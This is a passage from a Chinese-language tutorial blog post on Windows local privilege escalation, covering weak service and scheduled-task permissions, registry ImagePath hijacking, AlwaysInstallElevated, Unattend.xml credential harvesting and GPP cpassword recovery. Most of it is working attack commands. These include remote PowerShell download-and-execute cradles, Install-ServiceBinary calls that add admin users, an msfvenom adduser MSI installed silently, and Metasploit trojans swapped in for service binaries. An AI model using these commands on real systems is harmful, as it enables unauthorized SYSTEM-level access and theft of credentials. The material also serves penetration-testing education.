<p>Windows 系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件。因此，如果一个低权限的用户对此系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。Windows 服务是以System权限运行的，因此，其文件、文件夹和注册表键值都是受强访问控制机制保护的。但是，在某些情况下，操作系统中仍然存在一些没有得到有效保护的服务。</p>
<p>该漏洞利用有以下两种情况：</p>
<ul>
<li>服务未运行：攻击者会使用任意服务直接替换原来的服务，然后重启服务。</li>
<li>服务正在运行且无法终止：这种情况符合绝大多数漏洞利用的场景，攻击者通常会利用DLL劫持技术并尝试重启服务来提权。</li>
</ul>
<h3 id="1-利用powerupps1脚本">1. 利用PowerUp.ps1脚本</h3>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp</a></p>
<p>这里我们利用一个Powershell的脚本——PowerUp，该脚本的AllChecks模块会检测目标主机存的Windows服务漏洞，然后通过直接替换可执行文件本身来实现权限的提升。</p>
<blockquote>
<p>AllChecks模块的通常应用对象如下：</p>
<ul>
<li>没有被引号引起来的服务的路径。</li>
<li>服务的可执行文件的权限设置不当</li>
<li>Unattend.xml文件</li>
<li>注册表键AlwaysInstallElevated</li>
</ul>
</blockquote>
<p>将该脚本远程下载或本地导入后，执行Invoke-AllChecks命令进行漏洞检测</p>
<pre><code class="hljs scss">powershell -exec bypass -c "<span class="hljs-built_in">IEX</span>(New-Object Net.WebClient)<span class="hljs-selector-class">.DownloadString</span>('http://<span class="hljs-number">39</span>.xxx.xxx.<span class="hljs-number">210</span>/PowerUp.ps1');Invoke-ALLChecks"</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547428.png" alt></p>
<p>如上图，可以看到PowerUp列出了所有可能存在该漏洞的服务的信息，并在AbuseFunction部分直接给出了利用方式。我们可以看到，目标主机的WhoamiTest服务可能存在该漏洞，然后我们再用icacls命令来测试该服务的可执行文件目录的<code>C:\Program Files\Program Folder\Hello Whoami\whoami.exe</code>文件是否有写入权限：</p>
<pre><code class="hljs scss">icacls "C:\Program Files\Program Folder\Hello Whoami\whoami.exe<span class="hljs-string">"</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547429.png" alt></p>
<p>如上图，可以看到我们对whoami.exe文件是有完全控制权的，那么我们就可以<strong>直接将whoami.exe替换成我们的msf马</strong>，当服务重启时，我们就会得到一个System权限的meterpreter。</p>
<p>这里，我们用“AbuseFunction”那里已经给出的具体操作方式，执行如下。</p>
<p>将原来的服务可执行文件备份，并用一个可添加管理员用户的恶意可执行文件代替它，默认添加的用户名为join，密码为Password123!：</p>
<pre><code class="hljs scss">powershell -exec bypass -c <span class="hljs-built_in">IEX</span>(New-Object Net.WebClient)<span class="hljs-selector-class">.DownloadString</span>('http://<span class="hljs-number">39</span>.xxx.xxx.<span class="hljs-number">210</span>/PowerUp.ps1');Install-ServiceBinary -ServiceName 服务名</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547430.png" alt></p>
<p>接下来停止并再启动该服务的时候，但由于我们当前是普通用户，我们没有权限重启服务，所以我们可以等目标系统重启，我们通过msf控制目标机执行“shutdown -r”命令来重启，重启后即可成功创建join用户：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547431.png" alt></p>
<p>添加指定的管理员用户：</p>
<pre><code class="hljs scss">Install-ServiceBinary -ServiceName 服务名 -UserName Bunny -Password Liufupeng123</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547432.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547433.png" alt></p>
<p>执行命令：</p>
<pre><code class="hljs scss">Install-ServiceBinary -ServiceName 服务名 -Command "whoami"   <span class="hljs-comment">// -Command后加要执行的命令</span></code></pre>
<h3 id="2-service_permissions-模块">2. service_permissions 模块</h3>
<p>该漏洞提权在metasploit上面对应的模块为<code>exploit/windows/local/service_permissions：</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547434.png" alt></p>
<p>如上图，该模块有两个可以设置的选项，其中如果把AGGRESSIVE选项设为“true”，则可以利用目标机器上每一个有该漏洞的服务，设为“false”则在第一次提权成功后就会停止工作。演示如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547435.png" alt></p>
<p>当然还是需要迁移进程</p>
<h2 id="不安全的注册表权限配置">不安全的注册表权限配置</h2>
<p>在Windows中，和Windows服务有关的信息存储在<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services</code>注册表项中。</p>
<p>服务对应的程序路径存储<code>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service\服务名\ImagePath</code>。如果低权限用户对这个键值有写权限，那么就可以控制这个服务，运行我们的程序，拿到高权限。</p>
<p>以服务360rp为例，服务对应的程序路径存储在<code>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service\360rp\ImagePath</code>中，如果我们对这一键值有写入权限就可以修改服务对应的程序路径，让系统以SYSTEM权限运行我们的程序，从而达到提权的目标。如下所示，我们可以使用SubInACL(<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=23510">https://www.microsoft.com/en-us/download/details.aspx?id=23510</a>)工具去检查注册表项的权限。建议本地安装后找到 subinacl.exe 拷贝到目标机器上运行。</p>
<pre><code class="hljs scss">subinacl<span class="hljs-selector-class">.exe</span> /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service\<span class="hljs-number">360</span>rp" /<span class="hljs-attribute">display</span></code></pre>
<p>如果我们对注册表有写入权限，就可以修改注册表，使得服务启动时运行我们的恶意程序：</p>
<pre><code class="hljs scss">reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service\<span class="hljs-number">360</span>rp" /t REG_EXPAND_SZ /v ImagePath /d "C:\programdata\adduser.exe<span class="hljs-string">" /f</span></code></pre>
<p>在下一次启动该服务时，adduser.exe将会以SYSTEM权限运行。成功提权后记得修改回配置。</p>
<h2 id="注册表键alwaysinstallelevated">注册表键AlwaysInstallElevated</h2>
<p>并且还有Windows版本的前提：windows 7/8、03/08、12/16</p>
<blockquote>
<p>允许低权限用户以System权限安装文件。如果启用此策略设置项，那么任何权限的用户都以NT Authority\System权限来安装恶意的MSI文件。</p>
</blockquote>
<p><strong>防御方法</strong>： 只要禁用注册表键AlwaysInstallElevated 就可以阻止攻击者通过MSI文件进行提权</p>
<p>查看是否启用：</p>
<pre><code class="hljs scss"><span class="hljs-selector-id">#PowerUp</span>  
powershell<span class="hljs-selector-class">.exe</span> -exec bypass -Command "&amp; {Import-Module .\PowerUp<span class="hljs-selector-class">.ps1</span>;Get-RegistryAlwaysInstallElevated}"  
​  
#当然也可以查看注册表键值是否被定义  
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>
<p>如果系统没这个漏洞，它将输出错误:</p>
<pre><code class="hljs scss">subunit

ERROR: The system was unable to find the specified registry key or value.</code></pre>
<p>如果存在漏洞，上面将输出以下内容:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547436.png" alt></p>
<p>利用方式：</p>
<pre><code class="hljs scss">#利用方法,启用AlwaysInstallElevated后，可以通过命令行调用msiexec安装msi文件，msi文件内包含要执行的Payload，Payload将会以System权限执行  
msiexec /quiet /qn /<span class="hljs-selector-tag">i</span> muma<span class="hljs-selector-class">.msi</span>

<span class="hljs-comment">// 先利用msfvenom生成misc文件，之后进行安装</span>
msfvenom -<span class="hljs-selector-tag">p</span> windows/adduser USER=rottenadmin PASS=<span class="hljs-selector-tag">P</span><span class="hljs-keyword">@ssword</span>123! -f msi-nouac -o rotten.msi

msiexec /quiet /qn /i <span class="hljs-attribute">C</span>:\programdata\rotten.msi
# /quiet    安装过程中禁止向用户发送消息
# /qn       不使用GUI
# /i        安装程序</code></pre>
<p>当然也可以使用MSF模块：<code>exploit/windows/local/always_install_elevated</code>进行利用</p>
<blockquote>
<p>该模块会创建一个文件名随机的MSI文件 并在提权后删除所有已部署的文件</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547437.png" alt></p>
<p>设置session之后run即可</p>
<h2 id="自动安装配置文件">自动安装配置文件</h2>
<blockquote>
<p>网络管理员在内网中给多台机器配置同一个环境时，通常不会逐个配置，而是使用脚本批量部署。在这个过程中，会使用安装配置文件。这些文件中包含所有的安装配置信息，其中一些还可能包含管理员账号和密码</p>
<p>这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p>
</blockquote>
<p>全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中：</p>
<pre><code class="hljs scss">- C:\sysprep.inf
- C:\syspreg\sysprep.xml
- C:\Windows\system32\sysprep.inf
- C:\windows\system32\sysprep\sysprep.xml
- C:\unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattended.xml
- C:\Windows\Panther\Unattend\Unattended.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\System32\Sysprep\Unattend.xml
- C:\Windows\System32\Sysprep\Panther\Unattend.xml</code></pre>
<p>在这些文件中通常包含用户名和密码，密码使用base64编码，并且在最后会附加”Password”，所以真正的密码需要去掉最后的”Password”。</p>
<p>可以用以下命令来全盘搜索Unattend.xml文件：</p>
<pre><code class="hljs scss">dir /<span class="hljs-selector-tag">b</span> /s c:\Unattend.xml

C:\Users\user\Desktop&gt; dir C:*vnc.ini /s /b /c

#或者在名称中包含关键词的项目：
C:\Users\user\Desktop&gt; dir C:\ /s /b /c | findstr /sr *password*

#或者可以在文件内容中搜索password之类的关键字：
C:\Users\user\Desktop&gt;findstr /si password *.txt | *.xml | *.ini

#可以查询注册表，例如，字符串password：
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s</code></pre>
<ul>
<li>/s：显示指定目录和所有子目录中的文件。</li>
</ul>
<p>除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。</p>
<p>打开文件之后格式为xml格式然后可以进行搜索<code>User</code>、<code>Accounts</code>、<code>UserAccounts</code>、<code>LocalAccounts</code>、<code>Administrator</code>、<code>Password</code>或者经过base64加密的密码，因为我们只需要这部分，例如：</p>
<pre><code class="hljs xml">......

<span class="hljs-tag">&lt;<span class="hljs-name">UserAccounts</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">LocalAccounts</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">LocalAccount</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Password</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">Value</span>&gt;</span>UEBzc3dvcmQxMjMhUGFzc3dvcmQ=<span class="hljs-tag">&lt;/<span class="hljs-name">Value</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">PlainText</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">PlainText</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">Password</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span>Local Administrator<span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">DisplayName</span>&gt;</span>Administrator<span class="hljs-tag">&lt;/<span class="hljs-name">DisplayName</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Group</span>&gt;</span>Administrators<span class="hljs-tag">&lt;/<span class="hljs-name">Group</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Name</span>&gt;</span>Administrator<span class="hljs-tag">&lt;/<span class="hljs-name">Name</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">LocalAccount</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">LocalAccounts</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">UserAccounts</span>&gt;</span>

......</code></pre>
<p>在这个Unattend文件中，我们可以看到一个本地账户被创建并加入到了管理员组中。管理员密码没有以明文形式显示，但是显然密码是以Base64进行编码的。</p>
<pre><code class="hljs scss">echo "UEBzc3dvcmQxMjMhUGFzc3dvcmQ=" | base64 -d</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547438.png" alt></p>
<p><strong>解密得密码为"P@ssword123!Password"，但是微软在进行编码前会在Unattend文件中所有的密码后面都追加"Password"，所以我们本地管理员的密码实际上是"P@ssword123!"。</strong></p>
<h3 id="msf模块">MSF模块</h3>
<p>这里msf中也集成了相应的模块：<code>post/windows/gather/enum_unattend</code>（贴上网上的原图）</p>
<p>同样的设置完session之后run即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547439.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547440.png" alt></p>
<h3 id="powerup的模块">PowerUp的模块</h3>
<pre><code class="hljs powershell">powershell <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">"IEX(New-Object Net.WebClient).DownloadString('http://ip/powerup.ps1');Get-UnattendedInstallFile"</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547441.png" alt></p>
<h2 id="计划任务">计划任务</h2>
<p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行恶意程序。</p>
<pre><code class="hljs scss">#查看计算机的计划任务
schtasks /query /fo LIST /v</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547442.png" alt></p>
<p>如上图，我们可以看到，在 C:\Program Files\schtasks\whoami目录有一个test.exe程序，它会在一个时间点自动运行，它会在计算机每次启动时运行，并且是用SYSTEM权限运行的。然后让我们看下我们对这个计划任务的路径是否有写入权限。</p>
<pre><code class="hljs scss">#查看指定目录的权限配置情况
accesschk<span class="hljs-selector-class">.exe</span> -dqv "D:\test<span class="hljs-string">" -accepteula</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547443.png" alt></p>
<p>可以清楚地看到，这里有一个很严重的配置错误，对于这个计划任务“test”来说，这里不仅用了system权限来运行，更糟糕的是，任何经过身份验证的用户（Authenticated Users）都对这个文件夹有写入的权限。所以，我们可以生成一个木马，做一个后门就可以了，在本次演示例子中，我们可以简单的用msf木马覆盖掉原来的“test.exe”，如下图我们将原来的test.exe备份后，上传我们自己生成的“test.exe”（msf木马）：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547444.png" alt></p>
<p>然后重开一个msfconsole，设置好监听，接下来对目标机执行重启命令“shutdown -r -t 0”让其重新启动：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547445.png" alt></p>
<p>重新启动目标主机后，在另一个msfconsole上面即可得到system权限的session：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547446.png" alt></p>
<p>常用命令</p>
<pre><code class="hljs scss">accesschk64<span class="hljs-selector-class">.exe</span> /accepteula 
<span class="hljs-comment">// 第一次运行SysInternals工具包里的工具时 会弹出一个许可协议对话框 使用accepteula参数自动接受许可协议</span>

<span class="hljs-comment">// 查看某个驱动器下所有「权限配置」有问题的文件夹：</span>
accesschk64<span class="hljs-selector-class">.exe</span> -uwdqsUsers C:\ 
accesschk.exe -uwdqs <span class="hljs-string">"Authenticated Users"</span> c:\

// 查看某个驱动器下所有「权限配置」有问题的文件：
accesschk.exe -uwqs <span class="hljs-string">"Authenticated Users"</span> c:\*.*
accesschk64.exe -uwdqsUsers c:\*.*</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547447.png" alt></p>
<p>如上图可以看到对这个目录下的每一个文件它都列出了Authenticated Users用户组的权限，R为读权限，W为写权限，RW表示有读写权限，如果前面为空则表示没有权限。</p>
<p>根据前面这几个提权的思路，当我们检查文件或文件夹权限的时候，需要考虑哪些点是易受攻击的点。你需要花费时间来检查所有的启动路径，Windows服务，计划任务和Windows启动项等。</p>
<h1 id="0x05-组策略首选项提权">0x05 组策略首选项提权</h1>
<blockquote>
<p>Windows 2008 Server引入了一项新功能：策略首选项，组策略首选项使管理员可以部署影响域中计算机/用户的特定配置，通过在组策略管理控制台中配置的组策略首选项，管理员可以推出多种策略，例如，当用户登录其计算机时自动映射网络驱动器，更新内置管理员帐户的用户名或对注册表进行更改。</p>
</blockquote>
<h2 id="相关知识">相关知识</h2>
<h3 id="sysvol">SYSVOL</h3>
<blockquote>
<p>SYSVOL是AD(活动目录)里面一个存储域公共文件服务器副本的共享文件夹，所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。</p>
</blockquote>
<pre><code class="hljs scss">所有组策略均存储在：\\&lt;domain&gt;\SYSVOL\&lt;domain&gt;\Policies\</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547448.png" alt></p>
<h3 id="组策略偏好gpp">组策略偏好GPP</h3>
<blockquote>
<p>win2008发布了GPP，其中GPP最有用的特性，是在某些场景存储和使用凭据，其中包括：映射驱动 ，创建本地用户数据源，打印机配置，创建/更新服务，计划任务，更改本地Administrator密码</p>
</blockquote>
<p>此处的漏洞就是：为方便管理，网络管理员会使用域策略进行统一的配置和管理，那么所有机器的本地管理员密码就是一样的，造成了即使不知道密码的情况下也能修改组策略首选项的密码，也可以通过脚本破解组策略首选项文件中密码的漏洞。<br>
<code>post/windows/gather/credentials/gpp</code></p>
<p>这里简单找网上一个环境配置示例：</p>
<p>1：创建组策略，批量修改域中机器的本地管理员密码</p>
<p>在域控上执行：开始——&gt;运行——&gt;输入 gpmc.msc ——&gt;<a target="_blank" rel="noopener" href="http://xn--kevin-2n7jp22x.com">选择kevin.com</a>——&gt;右键组策略对象——&gt;新建，我这里新建一个test组策略</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547449.png" alt></p>
<p>右键刚刚新建的组策略，编辑。会弹出一个组策略管理编辑器，然后 计算机配置——&gt;首选项——&gt;控制面板设置——&gt;本地用户和组</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547450.png" alt></p>
<p>右键本地用户和组——&gt;新建——&gt;本地用户。我们将域中每个计算机的本地密码设置成 <strong>qwer123456.</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547451.png" alt></p>
<p>然后将Domain Computers添加到组策略应用的组中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547452.png" alt></p>
<p>强制更新组策略</p>
<pre><code class="hljs scss">gpupdate /foce</code></pre>
<p>至此，错误的组策略配置算是完成了</p>
<p>2：获取组策略的凭据</p>
<p>管理员在域中新建一个组策略后，操作系统会自动在SYSVO共享目录中生成一个XML文件，该文件中保存了该组策略更新后的密码。该密码使用AES-256加密算法，安全性还是比较高的。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在XML文件中的密码的安全性大大降低。任何域用户和域信任的用户均可对该共享目录进行访问，这就意味着，任何用户都可以访问保存在XML文件中的密码并将其解密，从而控制域中所有使用该账号、密码的本地管理员计算机。在SYSVOL中搜索，可以找到Groups.xml文件。找到其中的cpassword字段，该字段是用AES-256算法加密的，<br>
qwer123456.加密后的密文7ud2rxJhwxT5iaNrNltLxQcQ1hNN2cmCgxha3Faj4YA</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547454.png" alt></p>
<h2 id="powershell获取cpassword">powershell获取cpassword</h2>
<p>PowerSploit中的Get-GPPPassword.ps1脚本可以获取组策略中的密码。注意，我们只需要在域内任何一台以域用户权限登录的机器上均可查询到。</p>
<pre><code class="hljs scss">Import-Module .\Get-GPPPassword<span class="hljs-selector-class">.ps1</span>;Get-GPPPassword</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547455.png" alt></p>
<h2 id="msf获取cpassword">MSF获取cpassword</h2>
<p>MSF中 post/windows/gather/credentials/gpp 模块可以获取组策略中的密码。注意，我们只需要获取域内任何一台以域用户权限登录的机器的权限即可。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547456.png" alt></p>
<h2 id="其他">其他</h2>
<pre><code class="hljs scss"><span class="hljs-selector-id">#Empire</span>
usemodule privesc/gpp

<span class="hljs-selector-id">#PowerSploit</span> 的 Get-GPPPassword模块 检索通过组策略首选项推送的帐户的明文密码和其他信息。  
powershell "IEX (New-Object Net.WebClient)<span class="hljs-selector-class">.DownloadString</span>('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1');Get-GPPPassword"Import-Module .\Get-GPPPassword<span class="hljs-selector-class">.ps1</span>;Get-GPPPassword 

kali gpp-decrypt命令破解密码</code></pre>
<h1 id="0x06-绕过uac提权">0x06 绕过UAC提权</h1>
<blockquote>
<p>用户帐户控制(UAC)，它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。<br>
UAC通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被“提升权限”，而不是以管理员身份运行的程序。<br>
UAC不会自动阻止恶意软件，其目的不是确定程序是否是恶意软件，而是在没有用户许可下对恶<br>
软件的未授权行为进行掌控。</p>
</blockquote>
<h2 id="基本知识">基本知识</h2>
<p>一些没有管理员权限无法完成的操作：</p>
<ul>
<li>注册表修改（如果注册表项在HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的）</li>
<li>加载设备驱动程序</li>
<li>DLL注入</li>
<li>修改系统时间（时钟）</li>
<li>修改用户帐户控制设置（通过注册表，可以启用/禁用该设置，但您需要正确的权限才能执行此操作）</li>
<li>修改受保护的目录（例如Windows文件夹，Program Files）</li>
<li>计划任务（例如，以管理员权限自动启动）</li>
</ul>
<p>需要UAC的授权才能进行的操作列表如下：</p>
<pre><code class="hljs scss">配置Windows Update  
增加、删除账户  
更改账户类型  
更改UAC的设置  
安装ActiveX  
安装、卸载程序  
安装设备驱动程序  
将文件移动/复制到Program Files或Windows目录下  
查看其它用户的文件夹</code></pre>
<p>UAC有如下四种设置要求：</p>
<pre><code class="hljs scss">#始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户 

#仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户 

#仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度  

#从不提示：当用户为系统管理员时，所有程序都会以最高权限运行</code></pre>
<h2 id="msf模块利用">MSF模块利用</h2>
